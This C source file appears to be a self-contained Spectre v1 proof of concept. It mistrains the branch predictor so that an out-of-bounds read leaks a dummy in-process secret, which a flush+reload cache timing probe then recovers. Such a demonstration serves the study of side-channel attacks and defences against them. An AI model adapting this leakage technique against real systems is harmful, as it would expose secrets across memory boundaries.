#include <stdio.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define N_TRAINING 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 9
#define SECRET "mysecret"
#define DATA "public"
int DATA_SIZE __attribute__ ((aligned (256))) = 7;

cp_t* flush_reload_arr __attribute__ ((aligned (256)));


/*
 * Variables required in cache:
 *  index
 *  DATA
 *
 * Variables requried in mem:
 *  DATA_SIZE
 *
 * Training:    index=0
 * Attack:      index={iterate through SECRET}
 */
void victim_func(int index) {

    //flush bound value
    flush(&DATA_SIZE);
    cpuid();

    //access (possibly out of bounds)
    if (index < DATA_SIZE) {
        unsigned char x = DATA[index];
        volatile cp_t cp = flush_reload_arr[x];
    }
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //Access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING + 1;
    int accesses[n_accesses];
    for(int i = 0; i < n_accesses; i++) accesses[i] = 0;
    accesses[n_accesses-1] = secret_index;

    //Misstrain branch predictor, access out of bounds on last call
    for(int i = 0; i < n_accesses; i++) {
        victim_func(accesses[i]);

        cpuid();
        //flush hits from training phase (all but last access)
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    //make sure previous loop finishes execution
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}



int main(int argc, char* argv[]) {

    printf("SECRET \t%p\tsize = %d\nDATA \t%p\tsize = %d\nDATA[%d]\t%p\n",
           &SECRET, SECRET_SIZE, &DATA, DATA_SIZE, DATA_SIZE, &DATA[DATA_SIZE]);

    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {

        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(DATA_SIZE + s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

    return 0;
}